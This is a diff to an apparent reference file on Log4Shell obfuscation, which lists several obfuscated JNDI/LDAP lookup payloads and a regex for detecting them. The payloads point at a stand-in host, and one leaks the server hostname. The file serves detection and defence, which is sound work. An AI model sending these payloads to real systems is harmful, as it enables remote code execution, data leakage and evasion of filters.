@@ -4,6 +4,8 @@ Current Log4Shell obfuscation techniques observed or reported (Also works on rmi
 
 # Obfuscation
 
+```
+
 ${${lower:j}${lower:n}${lower:d}${lower:i}:${lower:l}${lower:d}${lower:a}${lower:p}://test/a}
 
 ${${lower:j}${lower:n}${lower:d}${lower:i}:${lower:l}${lower:d}${lower:a}${lower:p}://${upper:t}est/a} 
@@ -14,6 +16,12 @@ ${${::-j}${${::-n}${${::-d}${${::-i}:${::-l}${${::-d}${${::-a}${${::-p}://test/a
 
 ${${::-j}${${::-n}${${::-d}${${::-i}:${::-l}${${::-d}${${::-a}${${::-p}://${hostname}.test/a}
 
+```
+
 # Regex
 
+```
+
 .*\$\{.{0,20}j.{0,20}n.{0,20}d.{0,20}i.{0,150}:.{0,5}\/.*\}
+
+```
